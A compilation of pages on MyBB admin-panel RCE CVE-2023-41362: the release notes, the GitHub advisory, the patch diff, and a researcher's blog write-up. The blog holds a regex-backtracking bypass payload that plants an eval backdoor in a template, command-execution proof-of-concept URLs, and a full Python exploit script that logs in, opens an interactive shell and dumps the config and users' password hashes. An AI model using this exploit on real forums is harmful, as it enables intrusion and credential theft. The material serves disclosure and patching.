=== Content from mybb.com_ccfd11c4_20250110_202523.html ===

# [Page-1 MyBB](https://mybb.com/)

* [Home](https://mybb.com/)
* [Download](https://mybb.com/download/)
* [Community](https://community.mybb.com/)
* [Extend](https://community.mybb.com/mods.php)
* [Docs](https://docs.mybb.com/)
* [Blog](https://blog.mybb.com/)

Search
Cancel

MyBB 1.8.36

28 August 2023

Security

code 1836

Full Package

Install a new MyBB forum or upgrade from older versions.

.zip
– 2.21 MB

[Download from **MyBB.com**](https://resources.mybb.com/downloads/mybb_1836.zip)
[Download from **GitHub.com**
(mirror)](https://github.com/mybb/mybb/releases/download/mybb_1836/mybb_1836.zip)

sha512:

5ffe9f3ed46525eda68ac1204bc2a65241a61506605d9ea88d92d49e6a0782adfa5920e9f9d6f45446c2814eba016ed45ab958966ea8c947bca01fc08d64058e

More checksums…

sha256:

afd81b7c460c601964aae03ee79c4279acf80809ff898a6504d16f872e64cb7d

sha1:

edca66b2cf7292e68a005b64995ad2da8c78ae73

md5:

66e5994f46caac3273021a9d9213deba

Changed Files

Upgrade from the previous version.

.zip
– 0.01 MB

[Download from **MyBB.com**](https://resources.mybb.com/downloads/changed_files_1836.zip)
[Download from **GitHub.com**
(mirror)](https://github.com/mybb/mybb/releases/download/mybb_1836/changed_files_1836.zip)

sha512:

bb5120f2a5bcd0764f2ce157ef416b273734a0322f7f12747166a7ef73f841fe5e57d57fa649dab4fff1af357e92cd6773b8e35af370216996aa8864605abfa5

More checksums…

sha256:

58c57f457f0db7563fb4b7fd5e60c641cc4ce8803e1a2e0f2f1d67008b533432

sha1:

618e78a8789727e7917080c5a88807ec7b71e84b

md5:

f6450cfe496449fdd4452eafad7dd94b

[How to verify packages](/download/verifying/)

## Upgrading to this Version

To upgrade from the previous version: **copy and overwrite files** from the Changed Files package.

Upgrading from older versions may require running the `install/` upgrade script.

Before performing any upgrade, remember to **backup** your forum’s files and database and store them safely.

If you have edited core files, including language files, please make sure you make a changelog for these changes so you can make them again (if necessary) once the upgrade is complete.

Follow the [Upgrade Documentation](https://docs.mybb.com/1.8/install/upgrade/) for more detailed instructions.

# Security Vulnerabilities Addressed (1)

High risk
## ACP Templates RCE [[1]](https://github.com/mybb/mybb/security/advisories/GHSA-pr74-wvp3-q6f5 "Advisory: ACP Templates RCE") [[2]](https://blog.sorcery.ie/posts/mybb_acp_rce/ "MyBB Admin Panel RCE CVE-2023-41362")

[CWE-94](https://cwe.mitre.org/data/definitions/94.html "Code Injection")

`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`

CVE-2023-41362

Reported by [Emmet Leahy](https://sorcery.ie)

[{"admin":[{"inc":["functions.php"]}]},{"inc":["class\_core.php"]}]
# Changed Files ()

* [MyBB Project](https://mybb.com/about/)
* [Get Involved](https://mybb.com/get-involved/)
* [Support](https://mybb.com/support/)
* [Contact](https://mybb.com/contact/)

* [mybb](https://github.com/mybb)
* [mybboard](https://facebook.com/mybboard)
* [@mybb](https://twitter.com/mybb)
* [@mybbsecurity](https://twitter.com/mybbsecurity)
* [@mybb@…](https://fosstodon.org/%40mybb)

Copyright © 2002-2025 MyBB Group



=== Content from github.com_93cba8ea_20250110_202523.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmybb%2Fmybb%2Fsecurity%2Fadvisories%2FGHSA-pr74-wvp3-q6f5)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmybb%2Fmybb%2Fsecurity%2Fadvisories%2FGHSA-pr74-wvp3-q6f5)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=mybb%2Fmybb)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mybb](/mybb)
/
**[mybb](/mybb/mybb)**
Public

* [Notifications](/login?return_to=%2Fmybb%2Fmybb) You must be signed in to change notification settings
* [Fork
  409](/login?return_to=%2Fmybb%2Fmybb)
* [Star
   1.1k](/login?return_to=%2Fmybb%2Fmybb)

* [Code](/mybb/mybb)
* [Issues
  280](/mybb/mybb/issues)
* [Pull requests
  44](/mybb/mybb/pulls)
* [Actions](/mybb/mybb/actions)
* [Projects
  2](/mybb/mybb/projects)
* [Wiki](/mybb/mybb/wiki)
* [Security](/mybb/mybb/security)
* [Insights](/mybb/mybb/pulse)

Additional navigation options

* [Code](/mybb/mybb)
* [Issues](/mybb/mybb/issues)
* [Pull requests](/mybb/mybb/pulls)
* [Actions](/mybb/mybb/actions)
* [Projects](/mybb/mybb/projects)
* [Wiki](/mybb/mybb/wiki)
* [Security](/mybb/mybb/security)
* [Insights](/mybb/mybb/pulse)

# ACP Templates RCE

High

[dvz](/dvz)
published
GHSA-pr74-wvp3-q6f5
Aug 28, 2023

## Package

MyBB

## Affected versions

< 1.8.36

## Patched versions

1.8.36

## Description

### Impact

Improper validation logic in the Admin CP's *Templates* module allows remote authenticated users to execute arbitrary code (RCE) by supplying specially crafted template content.

The vulnerable module requires administrative access with one of the following permissions:

* *Can manage templates?*
* *Can manage themes?*

[CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)

### Details

In MyBB 1.8, templates rely on HTML code with basic references to PHP variables, rendered by executing them as PHP code (`eval()`). This limitation is enforced through regular expression-based validation (performed during the importing of themes, and modification of individual templates).

However, the validation process did not account for runtime errors related to regular expression operations in PHP (PCRE) that may occur i.a. when resource limits are exceeded when attempting to process specific content.

As a result of using [loose comparisons](https://www.php.net/manual/en/types.comparisons.php) (which allow [type juggling](https://www.php.net/manual/en/language.types.type-juggling.php)) in connection with PHP functions whose return types may change depending on the error state, the returned values may have been misinterpreted as those indicating safe content:

* [`preg_match()`](https://www.php.net/manual/en/function.preg-match.php) (*integer* `0` indicating no suspicious content — *boolean* `false` on PCRE errors)
* [`preg_replace()`](https://www.php.net/manual/en/function.preg-replace.php) (*string* with all remaining expressions interpreted as unsafe — `null` on PCRE errors)

### Patches

MyBB 1.8.36 resolves this issue with the following changes:

* Commit: [a43a6f2](https://github.com/mybb/mybb/commit/a43a6f22944e769a6eabc58c39e7bc18c1cab4ca)
  + `.patch`: <https://github.com/mybb/mybb/commit/a43a6f22944e769a6eabc58c39e7bc18c1cab4ca.patch>

Forum administrators can validate all existing templates after applying the patch using the Admin CP's *Tools & Maintenance → System Health → Check Templates* tool.

### References

* Release Notes: <https://mybb.com/versions/1.8.36/>

### For more information

Go to [mybb.com/security](https://mybb.com/security/) to report possible security concerns or to learn more about security research at MyBB.

### Contact

The security team can be reached at security@mybb.com.

### Severity

High

### CVE ID

CVE-2023-41362

### Weaknesses

[CWE-94](/advisories?query=cwe%3A94)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_280e499e_20250110_202522.html ===
From a43a6f22944e769a6eabc58c39e7bc18c1cab4ca Mon Sep 17 00:00:00 2001
From: dvz
Date: Mon, 28 Aug 2023 19:25:35 +0200
Subject: [PATCH] Fix ACP Templates RCE
---
admin/inc/functions.php | 7 ++++---
1 file changed, 4 insertions(+), 3 deletions(-)
diff --git a/admin/inc/functions.php b/admin/inc/functions.php
index 15e00658da..0d6901d3b1 100644
--- a/admin/inc/functions.php
+++ b/admin/inc/functions.php
@@ -667,20 +667,21 @@ function is\_mobile($useragent)
function check\_template($template)
{
// Check to see if our database password is in the template
- if(preg\_match('#\$config\[(([\'|"]database[\'|"])|([^\'"].\*?))\]\[(([\'|"](database|hostname|password|table\_prefix|username)[\'|"])|([^\'"].\*?))\]#i', $template))
+ if(preg\_match('#\$config\[(([\'|"]database[\'|"])|([^\'"].\*?))\]\[(([\'|"](database|hostname|password|table\_prefix|username)[\'|"])|([^\'"].\*?))\]#i', $template) !== 0)
{
return true;
}
// System calls via backtick
- if(preg\_match('#\$\s\*\{#', $template))
+ if(preg\_match('#\$\s\*\{#', $template) !== 0)
{
return true;
}
// Any other malicious acts?
// Courtesy of ZiNgA BuRgA
- if(preg\_match("~\\{\\$.+?\\}~s", preg\_replace('~\\{\\$+[a-zA-Z\_][a-zA-Z\_0-9]\*((?:-\\>|\\:\\:)\\$\*[a-zA-Z\_][a-zA-Z\_0-9]\*|\\[\s\*\\$\*([\'"]?)[a-zA-Z\_ 0-9 ]+\\2\\]\s\*)\*\\}~', '', $template)))
+ $allowed = preg\_replace('~\\{\\$+[a-zA-Z\_][a-zA-Z\_0-9]\*((?:-\\>|\\:\\:)\\$\*[a-zA-Z\_][a-zA-Z\_0-9]\*|\\[\s\*\\$\*([\'"]?)[a-zA-Z\_ 0-9 ]+\\2\\]\s\*)\*\\}~', '', $template);
+ if($allowed === null || preg\_match("~\\{\\$.+?\\}~s", $allowed) !== 0)
{
return true;
}


=== Content from blog.sorcery.ie_60f669ec_20250110_202522.html ===

[Skip to main content](#main)
# [Sorcery Blog](/)

[Sorcery Ltd](https://sorcery.ie "Sorcery Ltd")

# MyBB Admin Panel RCE CVE-2023-41362

This blog post explores a critical vulnerability in [MyBB](https://mybb.com/)’s admin panel, leading to authenticated Remote Code Execution (RCE).
MyBB is a popular forum software with a template system that utilizes eval() to render templates.

We will discuss how this vulnerability in the admin panel’s template handling can be exploited for RCE.

We can change these templates in the admin panel. When we submit changes to templates they get put through the `check_template()` function in `admin/functions.php`.
This function employs regex patterns to scan templates for specific patterns that may indicate malicious code.

```
function check_template($template){
	// Check to see if our database password is in the template
	if(preg_match('#\$config\[(([\'|"]database[\'|"])|([^\'"].*?))\]\[(([\'|"](database|hostname|password|table_prefix|username)[\'|"])|([^\'"].*?))\]#i', $template)) {
		return true;
	}
	// System calls via backtick
	if(preg_match('#\$\s*\{#', $template)){
		return true;
	}
	// Any other malicious acts?
	// Courtesy of ZiNgA BuRgA
	if(preg_match("~\\{\\$.+?\\}~s", preg_replace('~\\{\\$+[a-zA-Z_][a-zA-Z_0-9]*((?:-\\>|\\:\\:)\\$*[a-zA-Z_][a-zA-Z_0-9]*|\\[\s*\\$*([\'"]?)[a-zA-Z_ 0-9 ]+\\2\\]\s*)*\\}~', '', $template))){
		return true;
	}
	return false;
}

```

If check\_template returns true the template will be rejected and we won’t be able to use it.

In the 3rd case the input is passed through preg\_replace before being checked by the preg\_match function.

In PHP the [Perl Compatible REgex (PCRE) functions](https://www.php.net/manual/en/book.pcre.php) (preg\_match, preg\_replace etc.) have a pitfall where they don’t throw an exception when they reach their backtrack limit. In the case of preg\_replace it will return an empty string when the backtrack limit is reached which allows us to bypass the last preg\_match. The regex used here is complex enough that we can cause [catastrophic backtracking](https://www.regular-expressions.info/catastrophic.html) with just `{$a[0]` with repeated `[0]` after it. This is a form of [ReDoS (Regex Denial of Service)](https://en.wikipedia.org/wiki/ReDoS).

You can use [this tool](https://devina.io/redos-checker) to determine if a regex is abusable, it even generates strings that trigger these issues.

You can test the behaviour of the PCRE functions in a PHP shell (`php -a`):

```
php > echo ini_get('pcre.backtrack_limit');
1000000
php > echo preg_replace('~\\{\\$+[a-zA-Z_][a-zA-Z_0-9]*((?:-\\>|\\:\\:)\\$*[a-zA-Z_][a-zA-Z_0-9]*|\\[\s*\\$*([\'"]?)[a-zA-Z_ 0-9 ]+\\2\\]\s*)*\\}~', '', '{$a'.str_repeat('[0]',1891).'}TESTSTRING');
php >

```

This should print TESTSTRING but instead it will print nothing. Removing one (or more) of the `[0]` parts (by reducing the number of repeats) will let it be printed as the backtracking/stack/recursion limit hasn’t been reached.

Now that we can bypass this check all we have to do is include the type payload it was made to prevent in your template (we must still avoid the regex checks before it).
The payload I went with was `{$db->insert_id(isset($_GET[1])?die(eval($_GET[1])):'')}`.
Initially I thought I needed to find a useful function that was in the scope to use the `{$x->()}` format but we found that once we had a function we could do any php calls we needed.
So we opted to use `$db->insert_id()` as it doesnt really have any effect after using it and doesn’t error loudly when it doesn’t get input.

# Proof of Concept

## Manually

To demonstrate this vulnerability manually, follow these steps:

1. Login to admin panel
2. Navigate to “Templates & Style” > “Templates” > “Default Templates.”
3. Select a template (for instance, “Who’s Online Templates”) and click on “online.”
4. Add the following payload to the top of the template:

```
<!--{$db->insert_id(isset($_GET[1])?die(eval($_GET[1])):'')}{$a[0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0]}-->

```

5. Click one of the Save buttons
6. * PHPInfo PoC: <http://example.com/online.php?1=phpinfo();>
   * Command Exec: <http://example.com/online.php?1=system('whoami;pwd');>

## Exploit script

```
#!/usr/bin/python3
# Exploit script for CVE-2023-41362
# https://blog.sorcery.ie/posts/mybb_acp_rce/
import requests
import html
import argparse
import logging
from base64 import b64encode
class CustomFormatter(logging.Formatter):
	yellow = "\x1b[33;20m"
	red = "\x1b[31;20m"
	bold_red = "\x1b[31;1m"
	reset = "\x1b[0m"
	format = "%(levelname)s: %(message)s"
	FORMATS = {
		logging.DEBUG: format,
		logging.INFO: "[*] %(message)s",
		logging.WARNING: yellow + format + reset,
		logging.ERROR: red + format + reset,
		logging.CRITICAL: bold_red + format + reset
	}
	def format(self, record):
		log_fmt = self.FORMATS.get(record.levelno)
		formatter = logging.Formatter(log_fmt)
		return formatter.format(record)
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
ch = logging.StreamHandler()
ch.setFormatter(CustomFormatter())
logger.addHandler(ch)
def get_postkey(text):
	return text.split('my_post_key" value="')[1].split('"')[0]
def send_php(php_code):
	return session.get(f"{target}/online.php",cookies={'1':b64encode(php_code.encode()).decode()}).text
def remove():
	logger.info("Removing payload from template")
	rm_payload = '$db->query("UPDATE {$db->table_prefix}templates SET template=SUBSTRING_INDEX(template,\'}-->\',-1) WHERE template LIKE \'%[0][0][0][0]%\'");'
	send_php(rm_payload)
	logger.warning("Payload removed")
	exit()
def dump_config():
	dump_config_payload = 'print_r($config);'
	print(send_php(dump_config_payload))
def dump_users():
	users_payload = '$q=$db->query("SELECT CONCAT_WS(\',\',uid,username,email,hex(regip),hex(lastip),password,salt) as x FROM {$db->table_prefix}users");while($r=$db->fetch_array($q)){print($r[\'x\'].PHP_EOL);}die();'
	logger.info(f"Saving user table to {domain}.txt")
	with open(f"{domain}.txt",'w') as f:
		f.write(send_php(users_payload))
	logger.info(f"Complete")
def shell():
	logger.info("Testing code exec...")
	page = send_php('echo "lmao";')
	if 'lmao' in page:
		logger.info("Shell is working")
	else:
		logger.warning("Shell doesnt seem to work correctly")
	logger.info("Special commands: exit (quit), remove (removes backdoor), config (prints mybb config), dump (dumps user table)")
	while True:
		command = input("Enter Command> ")
		if command in ['exit','quit']:
			break
		if command == 'remove':
			remove()
			continue
		if command == 'config':
			dump_config()
			continue
		if command == 'dump':
			dump_users()
			continue
		command = command.replace("'","\\'")
		page = send_php(f"system('{command}');")
		print(page)
if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="MyBB CVE-2023-41362 Exploit Script")
	parser.add_argument("target", help="Target URL (e.g., https://example.com)")
	parser.add_argument("username", help="Admin username")
	parser.add_argument("password", help="Admin password")
	parser.add_argument("--admincp", default="admin", help="Admin control panel path")
	parser.add_argument("--user-agent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36", help="User Agent")
	args = parser.parse_args()
	target = args.target.rstrip("/")
	domain = args.target.split('://')[1].split('/')[0]
	admincp_path = args.admincp
	# login to admin
	session = requests.Session()
	session.headers.update({"User-Agent":args.user_agent})
	logger.info(f"Logging into {target}/{admincp_path}/ as {args.username}")
	login = session.post(f"{target}/{admincp_path}/index.php", data={"username":args.username, "password":args.password, "do":"login"})
	if '<p id="message" class="error">' in login.text:
		logger.error("Login Failed")
		exit()
	if 'This account has been locked out' in login.text:
		logger.error("Account has been locked out for failing login too many times")
		exit()
	# we should have admin panel access now
	page = session.get(f"{target}/{admincp_path}/index.php?module=style-templates&action=edit_template&title=online&sid=1").text
	postkey = get_postkey(page)
	existing_template = html.unescape(page.split('<textarea name="template" class="" id="template" style="width: 100%; height: 500px;" rows="5" cols="45">')[1].split('</textarea>')[0])
	tid = page.split('tid" value="')[1].split('"')[0]
	# using html comment to hide the insert_id() response of 0
	# payload uses a lot of [0]'s to trigger catastrophic regex backtracking to bypass filter
	payload = "<!--{$db->insert_id(isset($_COOKIE[1])?die(eval(base64_decode($_COOKIE[1]))):'')}{$a"+("[0]"*2000)+"}-->"
	if '[0][0][0][0][0]' in existing_template:
		logger.warning('Template already contains our payload code? Skipping to sending commands...')
	else:
		page = session.post(f"{target}/{admincp_path}/index.php?module=style-templates&action=edit_template",data={'my_post_key':postkey, 'tid':tid,'title':'online','sid':1,'template':f"{payload}{existing_template}","continue":"Save and Continue Editing"})
		if "The selected template has successfully been saved." in page.text:
			logger.info("Template saved!")
		else:
			logger.error("Template failed to save")
	shell()

```
# Conclusion

In conclusion, this vulnerability in MyBB’s admin panel highlights the importance of rigorously checking the return values of PHP’s PCRE functions, [as MyBB did in their patch](https://github.com/mybb/mybb/commit/a43a6f22944e769a6eabc58c39e7bc18c1cab4ca.patch), because the functions will return False on failure (which is different to the return value 0 when they don’t match).
PHP also provides the [preg\_last\_error\_msg()](https://www.php.net/manual/en/function.preg-last-error-msg.php) and [preg\_last\_error()](https://www.php.net/manual/en/function.preg-last-error.php) functions which may be useful.

For web application security testers, we hope this post serves as a valuable resource for understanding and identifying similar issues. If you find any please let me know about it by email or on Fedi/Twitter.

# Timeline

| Date | Action |
| --- | --- |
| 12/08/2023 | Reported bug to [ZDI](https://www.zerodayinitiative.com/) |
| 24/08/2023 | ZDI Rejected the bug on the grounds that a high level of admin access is required |
| 25/08/2023 | Reported issue to MyBB |
| 28/08/2023 | [Patch and advisory released](https://github.com/mybb/mybb/security/advisories/GHSA-pr74-wvp3-q6f5) |
| 30/08/2023 | Number [CVE-2023-41362](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-41362) assigned |
| 11/09/2023 | Blog post and [exploit](https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE) released |

[2023-09-11](/posts/mybb_acp_rce/)

<https://blog.sorcery.ie/posts/mybb_acp_rce/>
[Sorcery Ltd](https://blog.sorcery.ie/)

* [#Mybb](https://blog.sorcery.ie/tags/mybb/)
* [#Rce](https://blog.sorcery.ie/tags/rce/)
* [#Regex](https://blog.sorcery.ie/tags/regex/)
* [#CVE-2023-41362](https://blog.sorcery.ie/tags/cve-2023-41362/)
* [#Redos](https://blog.sorcery.ie/tags/redos/)

